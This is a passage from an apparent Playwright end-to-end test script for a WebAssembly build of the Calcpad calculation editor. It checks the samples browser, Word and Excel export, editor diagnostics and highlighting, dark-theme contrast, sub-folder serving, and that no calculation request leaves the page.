    await dialog.waitFor({ timeout: 10000 });
}
const expectIds = (pred) => SAMPLES.filter(pred).map((s) => s.id).sort();
const haystack = (s) => `${s.title} ${s.description} ${s.codes.join(' ')} ${s.folder}`.toLowerCase();

// The link on an empty editor opens the browser.
await page.evaluate(() => (window).calcpadTabs.newUntitled(''));
await page.locator('.cprs-samples-link').waitFor({ state: 'visible', timeout: 5000 }).then(() => check(true, 'an empty editor shows the samples link'), () => check(false, 'an empty editor shows the samples link'));
await page.locator('.cprs-samples-link').click().catch(() => {});
await dialog.waitFor({ timeout: 10000 }).catch(() => {});
check(await dialog.isVisible(), 'the link opens the Samples browser');
// The Sheet syntax group (our addition) is listed with CalcpadCE's examples: its own manifest.
const SHEET_SAMPLES = JSON.parse(readFileSync(join(web, 'calcpad-web', 'public', 'sheet-samples', 'manifest.json'), 'utf8')).samples.length;
await items().first().waitFor({ timeout: 10000 }).catch(() => {});
check(await items().count() === SAMPLES.length + SHEET_SAMPLES, `the browser lists all ${SAMPLES.length} samples and ${SHEET_SAMPLES} sheet syntax samples (${await items().count()})`);
await page.screenshot({ path: join(out, 'browser-samples.png') });

// Search, code filter and groups narrow the list, to exactly the matching samples.
await page.locator('.cprs-s-search').fill('punching');
const punching = expectIds((s) => haystack(s).includes('punching'));
const gotPunching = await shownIds();
check(punching.length > 0 && punching.length < SAMPLES.length && JSON.stringify(gotPunching) === JSON.stringify(punching),
    `search "punching" shows exactly the ${punching.length} samples that mention it (${gotPunching.length})`);
await page.locator('.cprs-s-search').fill('');
await page.locator('.cprs-s-code').selectOption('EN 1998-1');
const seismic = expectIds((s) => s.codes.includes('EN 1998-1'));
const gotSeismic = await shownIds();
check(seismic.length > 0 && JSON.stringify(gotSeismic) === JSON.stringify(seismic), `the code filter EN 1998-1 shows exactly its ${seismic.length} samples (${gotSeismic.length})`);
await page.locator('.cprs-s-code').selectOption('');
await page.locator('.cprs-s-group', { hasText: /^Steel / }).click();
const steel = expectIds((s) => s.group === 'Steel');
check(JSON.stringify(await shownIds()) === JSON.stringify(steel), `the Steel group shows its ${steel.length} samples`);
await page.locator('.cprs-s-group', { hasText: /^All / }).click();

// The preview renders the selected sample, images included.
const withImage = SAMPLES.find((s) => s.assets.some((a) => /\.png$/.test(a.key)) && !s.scripts && !s.read);
await page.locator(`.cprs-s-item[data-sample-id="${withImage.id}"]`).click();
const previewFrame = page.frameLocator('.cprs-s-preview');
const previewImg = await previewFrame.locator('img').first().evaluate((img) => new Promise((ok) => {
    if (img.complete) return ok(img.naturalWidth);
    img.onload = () => ok(img.naturalWidth);
    img.onerror = () => ok(0);
}), null, { timeout: 30000 }).catch(() => 0);
check(previewImg > 0, `the preview renders "${withImage.title}" with its image`);
await page.screenshot({ path: join(out, 'browser-samples-preview.png') });
// A sample that #includes a sheet previews with no error bar (its included sheet is passed with it).
const withInclude = SAMPLES.find((s) => s.assets.some((a) => /\.cpd$/i.test(a.key)) && !s.scripts && !s.read);
await page.locator(`.cprs-s-item[data-sample-id="${withInclude.id}"]`).click();
await page.waitForFunction(() => { const d = document.querySelector('.cprs-s-preview')?.srcdoc ?? ''; return d.length > 2000 && !/Rendering\.\.\./.test(d); }, null, { timeout: 120000 });
const incPreview = await page.evaluate(() => { const d = document.querySelector('.cprs-s-preview').srcdoc; return { bar: /class="errorHeader">Found/.test(d), errs: (d.match(/<p class="err">/g) ?? []).length }; });
check(!incPreview.bar && incPreview.errs === 0, `the preview of "${withInclude.title}" (it #includes a sheet) has no error bar and no error (${JSON.stringify(incPreview)})`);
await page.keyboard.press('Escape');

// Every sample opens from the browser as an untitled copy and renders with no errors.
const sampleFailures = [];
examplePageErrors = [];
// --sample-filter <text> opens only the samples whose upstream path contains it (for quick runs).
const sampleFilter = arg('--sample-filter', '');
for (const s of SAMPLES.filter((x) => x.upstream.includes(sampleFilter))) {
    const text = sampleText(s);
    await page.evaluate(() => { (window).__converts = []; });
    await openSamples();
    await page.locator('.cprs-s-search').fill(s.title);
    await page.locator(`.cprs-s-item[data-sample-id="${s.id}"]`).click();
    await page.locator('.cprs-s-open').click();
    // A Python sample asks before it runs (once per tab; a fresh untitled copy is a fresh tab).
    if (s.python) await page.locator('#cprs-python-yes').click({ timeout: 20000 });
    let got = null;
    // Soil Stress and Deformations takes about a minute in WebAssembly, more on a busy machine.
    for (let i = 0; i < 750 && !got; i++) {
        await page.waitForTimeout(400);
        got = await page.evaluate((head) => (window).__converts.find((c) => !c.preview && c.content.startsWith(head)) ?? null, text.slice(0, 120));
    }
    const tab = await page.evaluate(() => ({ title: (window).calcpadTabs.activeTab?.title, path: (window).calcpadTabs.activeTab?.filePath }));
    const problems = [];
    if (!got) problems.push('no render');
    else if (got.errors.length) problems.push(`${got.errors.length} error(s): ${got.errors[0].message}`);
    if (tab.title !== s.title || tab.path) problems.push(`opened as ${tab.title} (${tab.path})`);
    // Its images come from the library (the transport turns them into data: URLs).
    if (s.assets.some((a) => /\.(png|jpe?g|gif|svg)$/i.test(a.key)) && got && got.libraryImages === 0) problems.push('images not shown from the library');
    // The editor resolves the copy's #include too: no undefined-macro (CPD-3303) marker for a macro an included sheet defines.
    if (got && s.assets.some((a) => /\.cpd$/i.test(a.key))) {
        let last = -1, same = 0;
        for (let i = 0; i < 50 && same < 3; i++) {
            await page.waitForTimeout(500);
            const c = await page.evaluate(() => window.monaco.editor.getModelMarkers({ resource: window.calcpadActiveEditor.getModel().uri }).length);
            same = c === last ? same + 1 : 0;
            last = c;
        }
        const undef = await page.evaluate(() => window.monaco.editor.getModelMarkers({ resource: window.calcpadActiveEditor.getModel().uri }).filter((k) => (typeof k.code === 'string' ? k.code : k.code?.value) === 'CPD-3303').length);
        if (undef) problems.push(`${undef} undefined-macro marker(s): the included sheet was not resolved`);
    }
    if (problems.length) sampleFailures.push(`${s.upstream}: ${problems.join('; ')}`);
    await page.evaluate(() => (window).calcpadTabs.close((window).calcpadTabs.activeId));
}
examplePageErrors = null;
check(sampleFailures.length === 0, `all ${sampleFilter ? `"${sampleFilter}"` : SAMPLES.length} samples open from the browser and render with no errors (${sampleFailures.slice(0, 5).join(' | ')})`);
for (const f of sampleFailures) console.log(`       ${f}`);

// ---- Word export (calcpad-docx-wasm) -------------------------------------------------------
const reportGroup = page.locator('.export-group').filter({ has: page.locator('.export-group-title', { hasText: /^Report$/ }) });
// A persistent handler: with only waitForEvent('dialog') the alert stayed open and the click hung.
const dialogs = [];
page.on('dialog', (d) => {
    if (d.type() === 'beforeunload') return; // answered above
    dialogs.push(d.message());
    void d.dismiss();
});
await page.evaluate(() => (window).calcpadActiveEditor.setValue("'Word export check\na = 2\nb = a^2/3 + sqr(a)\nL = 2.5m\n$Plot{x^2 @ x = 0 : 2}"));
await page.waitForTimeout(1500);
await openExportTab();
dialogs.length = 0;
const [download] = await Promise.all([
    page.waitForEvent('download', { timeout: 120000 }),
    reportGroup.getByRole('button', { name: /Save Word/ }).click({ timeout: 10000 }),
]);
const tmp = join(web, '..', 'target', 'tmp');
mkdirSync(tmp, { recursive: true });
const docxPath = join(tmp, 'word-check.docx');
await download.saveAs(docxPath);
const unzip = (part) => {
    try { return execFileSync('unzip', ['-p', docxPath, part], { encoding: 'utf8', maxBuffer: 64 << 20 }); } catch { return ''; }
};
const listing = (() => { try { return execFileSync('unzip', ['-l', docxPath], { encoding: 'utf8' }); } catch { return ''; } })();
const documentXml = unzip('word/document.xml');
check(dialogs.length === 0, `Save Word shows no "not available" message (${JSON.stringify(dialogs[0] ?? '')})`);
check(documentXml.includes('<w:body>') && documentXml.includes('Word export check'), 'Save Word downloads a .docx whose document holds the worksheet text');
const maths = (documentXml.match(/<m:oMath>/g) ?? []).length;
check(maths === 3, `each of the 3 equations is Office Math in the document (${maths})`);
check(/<m:f>/.test(documentXml) && /<m:rad>/.test(documentXml), 'the division and the square root are OMML fractions and radicals');
check(/word\/media\/image\d+\.png/.test(listing) && /word\/media\/image\d+\.svg/.test(listing), 'the plot is in the document as a PNG with its SVG beside it');
check(/asvg:svgBlip/.test(documentXml), 'the picture refers to the SVG for Word versions that show it');

// The Export dialog stays open after a save and its backdrop would catch the next click: close it.
await page.keyboard.press('Escape');
await page.locator('.tab-content.as-dialog').waitFor({ state: 'detached', timeout: 5000 }).catch(() => {});

// ---- Excel export (calcpad-rs's own) ---------------------------------------------------------
await page.evaluate(() => (window).calcpadActiveEditor.setValue("'<h3>Excel export check</h3>\na = 2\nL = ? {4.5}m\n#UI F = 12.5kN\nM = F*L\nv = [1; 2; 3]*1m\nK = [1; 2|3; 4]\na = a + 1\n'<table><tr><th>Bar</th><th>Area</th></tr><tr><td>1</td><td>2.5</td></tr></table>\n$Plot{x^2 @ x = 0 : 2}"));
await page.waitForTimeout(1500);
await page.locator('[data-ribbon-btn=file]').click();
const [xlsxDownload] = await Promise.all([
    page.waitForEvent('download', { timeout: 120000 }),
    page.locator('.cprs-menu button', { hasText: 'Export Excel...' }).click(),
]);
const xlsxPath = join(tmp, 'excel-check.xlsx');
await xlsxDownload.saveAs(xlsxPath);
// Read with openpyxl, as a spreadsheet program would.
let sheets = null;
try {
    sheets = JSON.parse(execFileSync('python3', ['-c',
        'import json,sys,openpyxl\nwb=openpyxl.load_workbook(sys.argv[1])\nd={ws.title:[[c.value for c in r] for r in ws.iter_rows()] for ws in wb}\nd["_images"]=len(wb["Report"]._images)\nd["_charts"]=len(wb["Report"]._charts)\nd["_chartpts"]=len(wb["Report"]._charts[0].series[0].xVal.numRef.numCache.pt) if wb["Report"]._charts else 0\nd["_links"]=sum(1 for r in wb["Report"].iter_rows() for c in r if c.hyperlink)\nprint(json.dumps(d))',
        xlsxPath], { encoding: 'utf8' }));
} catch (e) { sheets = { error: String(e).slice(0, 200) }; }
const sheetNames = Object.keys(sheets ?? {}).filter((k) => !k.startsWith('_'));
check(JSON.stringify(sheetNames) === JSON.stringify(['Report', 'Variables', 'v', 'K', 'Inputs', 'Plot data']), `File > Export Excel saves a workbook with a Report sheet, Variables, a sheet per vector and matrix, and Inputs (${JSON.stringify(sheetNames)})`);
{
    const report = sheets?.Report ?? [];
    const rowOf = (name) => report.find((r) => r[1] === name);
    check(report[0]?.slice(0, 6).join('|') === 'Description|Name|Expression|With the values|Value|Unit', `the Report sheet has its header (${JSON.stringify(report[0])})`);
    check(report.some((r) => r[0] === 'Excel export check'), 'the Report sheet holds the heading as a cell');
    const m = rowOf('M');
    check(m && m[2] === 'F \u00B7 L' && typeof m[4] === 'number' && m[4] === 56.25 && /kN/.test(m[5] ?? ''), `an equation is a row: name, expression, value and unit (${JSON.stringify(m)})`);
    check(m && /12\.5/.test(m[3] ?? ''), `... and the expression with the values put in (${JSON.stringify(m?.[3])})`);
    const bar = report.findIndex((r) => r[0] === 'Bar' && r[1] === 'Area');
    check(bar > 0 && report[bar + 1]?.[0] === 1 && report[bar + 1]?.[1] === 2.5, 'an HTML table is a cell range with its numbers as numbers');
    check(sheets?._charts === 1 && sheets?._chartpts >= 30 && sheets?._images === 0, `the plot is a native chart with its data, not a picture, in the Report sheet (${sheets?._charts} chart, ${sheets?._chartpts} points, ${sheets?._images} pictures)`);
    check(sheets?.['Plot data']?.[1]?.[0] === 'x' && sheets['Plot data'].length >= 32, 'the chart data is on the Plot data sheet');
    const v = rowOf('v');
    check(v && /see sheet "v"/.test(v[4] ?? '') && sheets?._links >= 2, `a vector or matrix value links to its sheet (${JSON.stringify(v?.[4])}, ${sheets?._links} links)`);
}
check(JSON.stringify(sheets?.Variables?.slice(1, 5)) === JSON.stringify([['a', 3, ''], ['L', 4.5, 'm'], ['F', 12.5, 'kN'], ['M', 56.25, 'kNm']]), `the variables in calculation order, numbers as numbers and units in their own column (${JSON.stringify(sheets?.Variables?.slice(1, 5))})`);
check(JSON.stringify(sheets?.Inputs) === JSON.stringify([['Name', 'Value', 'Unit'], ['L', 4.5, 'm'], ['F', 12.5, 'kN']]), `the input field and the #UI control are the inputs (${JSON.stringify(sheets?.Inputs)})`);
check(JSON.stringify(sheets?.v) === JSON.stringify([['Index', 'Value', 'Unit'], [1, 1, 'm'], [2, 2, 'm'], [3, 3, 'm']]), 'the vector has its own sheet');

// ---- editor language features from calcpad-highlighter-wasm ---------------------------------
// Diagnostics (Monaco markers), semantic tokens and the other Calcpad.Server endpoints that front
// Calcpad.Highlighter are answered in the page by the highlighter wasm (a second module, loaded
// on first use).
await page.reload();
await page.waitForFunction(() => (window).calcpadActiveEditor != null, null, { timeout: 30000 });
await setEditor("L = 6m\nr = L + undefined_name\nf(x) = x^2\nz = f(1; 2)\n'a comment");
const markers = await page.waitForFunction(() => {
    const ms = (window).monaco.editor.getModelMarkers({});
    return ms.length >= 2 ? ms.map((m) => ({ line: m.startLineNumber, col: m.startColumn, end: m.endColumn, msg: m.message })) : null;
}, null, { timeout: 30000 }).then((h) => h.jsonValue(), () => null);
check(markers != null, `the editor shows diagnostics from the highlighter wasm (${JSON.stringify(markers)?.slice(0, 200)})`);
if (markers) {
    check(markers.some((m) => m.line === 2 && /undefined/i.test(m.msg) && m.end > m.col), 'undefined_name on line 2 is marked as undefined');
    check(markers.some((m) => m.line === 4), 'the call f(1; 2) with too many parameters is marked on line 4');
}
const hlApi = async (endpoint, body, method = 'POST') => page.evaluate(async ([endpoint, body, method]) => {
    const r = await fetch(`/api/calcpad/${endpoint}`, { method, headers: { 'Content-Type': 'application/json' }, body: method === 'POST' ? JSON.stringify(body) : undefined });
    const t = await r.text();
    return { status: r.status, text: t };
}, [endpoint, body, method]);
const hl = await hlApi('highlight', { content: "L = 6m\n'caf\u00e9 \ud83d\ude00 text' + x", includeText: true });
const tokens = hl.status === 200 ? JSON.parse(hl.text).tokens : [];
const tokenOf = (line, text) => tokens.find((t) => t.line === line && t.text === text);
check(tokenOf(0, 'L')?.type === 'Variable' && tokenOf(0, '6')?.type === 'Const' && tokenOf(0, 'm')?.type === 'Units', 'highlight: L is a Variable, 6 a Const, m a Unit');
const comment = tokens.find((t) => t.line === 1 && t.type === 'Comment');
const line1 = "'caf\u00e9 \ud83d\ude00 text' + x";
const xTok = tokens.find((t) => t.line === 1 && t.text === 'x');
check(comment != null && comment.length === comment.text.length && xTok?.column === line1.length - 1, `highlight: columns and lengths are UTF-16 units, an emoji counts two (${JSON.stringify([comment?.length, xTok?.column, line1.length])})`);
const defs = await hlApi('definitions', { content: 'a = 2\nf(x; y = 1) = x*y\n#def m$ = 5' });
const dj = defs.status === 200 ? JSON.parse(defs.text) : {};
check(dj.variables?.[0]?.name === 'a' && dj.functions?.[0]?.name === 'f' && dj.macros?.[0]?.name === 'm$', 'definitions lists the variable, the function and the macro');
const sym = await hlApi('symbol-at-position', { content: 'a = 2\nb = a + a', line: 1, column: 4 });
const sj = sym.status === 200 ? JSON.parse(sym.text) : null;
check(sj?.symbolName === 'a' && sj.locations?.length === 3, 'symbol-at-position finds the three occurrences of a');
const pr = await hlApi('prettify', { content: '#if 1 > 0\nx = 1\n#end if' });
check(pr.status === 200 && JSON.parse(pr.text).content === '#if 1 > 0\n\tx = 1\n#end if', 'prettify indents the #if block');
const sn = await hlApi('snippets', null, 'GET');
const snj = sn.status === 200 ? JSON.parse(sn.text) : {};
check(snj.count > 1000 && snj.snippets?.some((x) => x.insert === 'sin(\u00a7)'), `snippets: the library has ${snj.count} entries`);
const codeView = await page.evaluate(async () => {
    const r = await fetch('/api/calcpad/convert?unwrap=true', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: 'a = 1\nb = a + 2m' }) });
    return r.text();
});
check(codeView.includes('<span class="variable">a</span>') && codeView.includes('<span class="const">2</span><span class="units">m</span>'), 'the unwrapped code view is highlighted with the tokenizer (loaded on demand into the engine worker)');
// Quick fix on the deprecated stored input warning (CPD-3419).
await setEditor("'Load -'q = ? {5}'kN/m\nb = q*2kN");
const legacyMarker = await page.waitForFunction(() => (window).monaco.editor.getModelMarkers({}).some((m) => (m.code?.value ?? m.code) === 'CPD-3419' && m.startLineNumber === 1), null, { timeout: 30000 }).then(() => true, () => false);
check(legacyMarker, 'a stored input field "? {5}" is marked CPD-3419 in the editor');
if (legacyMarker) {
    await page.evaluate(() => { const e = (window).calcpadActiveEditor; e.focus(); e.setPosition({ lineNumber: 1, column: 14 }); });
    await page.keyboard.press('ControlOrMeta+Period');
    const item = page.getByText('Convert to #UI', { exact: true }).first();
    const offered = await item.waitFor({ timeout: 8000 }).then(() => true, () => false);
    check(offered, 'the quick fix "Convert to #UI" is offered on that warning');
    if (offered) {
        await page.keyboard.press('Enter');
        await page.waitForTimeout(300);
        const fixed = await page.evaluate(() => (window).calcpadActiveEditor.getValue());
        check(fixed === "#UI 'Load -'q = 5'kN/m\nb = q*2kN", `the quick fix writes the #UI declaration (${JSON.stringify(fixed)})`);
    } else {
        await page.keyboard.press('Escape');
    }
}
const bad = await hlApi('lint', { content: '  ' });
check(bad.status === 400, 'lint of an empty document answers 400 like the server');
check(requests.some((r) => r.url.endsWith('/wasm/calcpad_highlighter_wasm_bg.wasm')), 'the highlighter wasm was loaded from /wasm/');

// ---- dark theme: form controls and drawings in the preview ----------------------------------
// Upstream's samples style a select for a white page (black text, no border, appearance none) and
// draw black-on-transparent SVG; on the dark preview both must stay readable (transport.ts).
{
    const luminance = (rgb) => {
        const [r, g, b] = rgb.match(/[\d.]+/g).slice(0, 3).map((v) => { const c = Number(v) / 255; return c <= 0.03928 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4; });
        return 0.2126 * r + 0.7152 * g + 0.0722 * b;
    };
    const contrast = (a, b) => { const [hi, lo] = [luminance(a), luminance(b)].sort((x, y) => y - x); return (hi + 0.05) / (lo + 0.05); };
    const sheet = [
        "'<p>Section type -",
        "'<select data-target=\"s\" style=\"font-weight:bold; border:none; background: none; color: black; box-shadow:none; appearance: none;\">",
        "'<option value=1>IPE 100</option><option value=2>IPE 120</option></select></p>",
        "'<svg width=\"80\" height=\"40\" viewBox=\"0 0 80 40\" xmlns=\"http://www.w3.org/2000/svg\"><text x=\"5\" y=\"20\" fill=\"black\">91</text></svg>",
        "'<div style=\"background:#f0f0ee\"><p id=\"card\">light card text</p></div>",
        "a = 1",
    ].join('\n');
    const read = async (colorScheme) => {
        const ctx = await browser.newContext({ viewport: { width: 1400, height: 900 }, colorScheme });
        await ctx.addInitScript(() => { if (window === window.top && !sessionStorage.getItem('seeded')) { sessionStorage.setItem('seeded', '1'); localStorage.clear(); } });
        const p = await ctx.newPage();
        await p.goto(`${origin}/`);
        await p.waitForFunction(() => (window).calcpadActiveEditor != null, null, { timeout: 30000 });
        await p.evaluate((t) => (window).calcpadActiveEditor.setValue(t), sheet);
        let got = null;
        for (let i = 0; i < 100 && !got; i++) {
            await p.waitForTimeout(250);
            for (const f of p.frames()) {
                if (f === p.mainFrame()) continue;
                got = await f.evaluate(() => {
                    const sel = document.querySelector('select[data-target="s"]');
                    const svg = document.querySelector('svg');
                    if (!sel || !svg) return null;
                    const cs = getComputedStyle(sel);
                    const card = document.querySelector('#card');
                    return {
                        dark: document.body.classList.contains('dark-theme'),
                        selColor: cs.color, selBg: cs.backgroundColor, selBorder: cs.borderTopWidth + ' ' + cs.borderTopStyle, selAppearance: cs.appearance,
                        pageBg: getComputedStyle(document.body).backgroundColor,
                        svgBg: getComputedStyle(svg).backgroundColor,
                        cardText: card ? getComputedStyle(card).color : '', cardBg: card ? getComputedStyle(card.parentElement).backgroundColor : '',
                        lightCard: !!document.querySelector('.cprs-light-card'),
                    };
                }).catch(() => null);
                if (got) break;
            }
        }
        await ctx.close();
        return got;
    };
    const dark = await read('dark');
    check(dark?.dark === true, 'the dark preview renders with the dark theme class');
    if (dark) {
        check(contrast(dark.selColor, dark.selBg) >= 4.5, `dark theme: the select's text has contrast against its own background (${dark.selColor} on ${dark.selBg}, ${contrast(dark.selColor, dark.selBg).toFixed(1)}:1)`);
        check(contrast(dark.selBg, dark.pageBg) >= 1.1 || /^[1-9]/.test(dark.selBorder), `dark theme: the select is recognisable (border ${dark.selBorder}, appearance ${dark.selAppearance})`);
        check(dark.selAppearance !== 'none' && /^[1-9]/.test(dark.selBorder), 'dark theme: the select has a border and a native arrow, not upstream\'s appearance:none');
        check(dark.svgBg === 'rgb(255, 255, 255)', `dark theme: an inline SVG drawing sits on a white card (${dark.svgBg})`);
        check(dark.lightCard && contrast(dark.cardText, dark.cardBg) >= 4.5, `dark theme: text on a worksheet's own light card is dark enough (${dark.cardText} on ${dark.cardBg})`);
    }
    const light = await read('light');
    check(light?.dark === false && light.selColor === 'rgb(0, 0, 0)' && light.svgBg === 'rgba(0, 0, 0, 0)' && light.selAppearance === 'none', `light theme: the select and the SVG are as upstream wrote them (${light?.selColor}, ${light?.svgBg}, ${light?.selAppearance})`);
}

// ---- select, radio and checkbox elements mapped to text boxes (e2e/select-map-check.mjs) ----------
{
    let output = '';
    let ok = true;
    try {
        // Asynchronous: this process serves the build the child loads.
        output = await new Promise((done, fail) => execFile('node', [join(here, 'select-map-check.mjs'), '--url', origin, '--out', join(out, 'select-map')], { encoding: 'utf8', timeout: 900000 }, (err, stdout, stderr) => (err ? fail(Object.assign(err, { stdout, stderr })) : done(stdout))));
    } catch (err) {
        ok = false;
        output = `${err.stdout ?? ''}${err.stderr ?? ''}`;
    }
    for (const line of output.split('\n').filter((l) => /^(ok  |FAIL)/.test(l))) check(line.startsWith('ok  '), `mapped controls: ${line.slice(5)}`);
    check(ok, 'the mapped-controls check passes');
}

// ---- 6. the same build from a sub folder ---------------------------------------------------
const sub = await context.newPage();
sub.on('pageerror', (e) => pageErrors.push(`/calcs/: ${e.message}`));
await sub.goto(`${origin}/calcs/`);
await sub.waitForFunction(() => (window).calcpadActiveEditor != null, null, { timeout: 30000 });
await sub.evaluate(() => (window).calcpadActiveEditor.setValue("'Sub folder check\nx = 6*7"));
let subText = '';
for (let i = 0; i < 75 && !/=\s*42/.test(subText); i++) {
    await sub.waitForTimeout(200);
    for (const f of sub.frames()) {
        if (f === sub.mainFrame()) continue;
        const t = await f.evaluate(() => document.body?.innerText ?? '').catch(() => '');
        if (t.includes('Sub folder check')) subText = t;
    }
}
check(/=\s*42/.test(subText), 'served from /calcs/, the app loads the engine and calculates (x = 42)');
const subFailed = requests.filter((r) => r.url.includes('/calcs/') && r.url.endsWith('.wasm')).length;
check(subFailed > 0, 'under /calcs/ the engine is fetched from /calcs/wasm/');

// ---- 3. no calculation request left the page ---------------------------------------------
const STATIC = /^\/(calcs\/)?(|index\.html|samples\/.*|sheet-samples\/.*|assets\/.*|wasm\/.*|py\/.*|fonts\/.*|report-fonts\/.*|ui-assets\/.*|icon\.png|favicon\.ico)$/;
const remote = requests.filter((r) => !r.url.startsWith('data:') && !r.url.startsWith('blob:'));
const api = remote.filter((r) => new URL(r.url).pathname.includes('/api/'));
// Other origins: only the exact library files on the list (and the one added in the test).
const ALLOWED_FOREIGN = new Set([...LISTED.keys(), UNLISTED]);
const foreign = remote.filter((r) => new URL(r.url).origin !== origin && !ALLOWED_FOREIGN.has(r.url) && !cspBlocked.has(r.url));
// The upstream examples ask for their own images (Images/..., relative to the page): GETs too.
const nonStatic = remote.filter((r) => new URL(r.url).origin === origin && (r.method !== 'GET' || !(STATIC.test(new URL(r.url).pathname) || /^\/(Images|Models)\/|^\/toc\.js$|^\/[^/]+\.(png|jpe?g|gif|svg)$/.test(new URL(r.url).pathname))));
check(api.length === 0, `no /api/ request on the network (${api.length}: ${api.map((r) => r.url).join(', ')})`);
check(foreign.length === 0, `no request to another origin (${foreign.map((r) => r.url).join(', ')})`);
check(nonStatic.length === 0, `only GETs of static files (${nonStatic.map((r) => `${r.method} ${r.url}`).join(', ')})`);
check(remote.some((r) => r.url.endsWith('/wasm/calcpad_wasm_bg.wasm')), 'the engine was loaded from /wasm/calcpad_wasm_bg.wasm');
const methods = [...new Set(remote.map((r) => r.method))];
console.log(`     ${remote.length} network requests in total, methods: ${methods.join(', ')}`);
writeFileSync(join(out, 'browser-requests.json'), JSON.stringify(requests, null, 1));
check(pageErrors.length === 0, `no uncaught page errors (${pageErrors.join(' | ')})`);

await browser.close();
stop();
console.log(failures.length ? `${failures.length} check(s) failed` : 'all browser checks passed');
console.log(`sample rendered to ${renderedDir}; diff with: python3 -I tools/compare_browser.py`);
process.exit(failures.length ? 1 : 0);
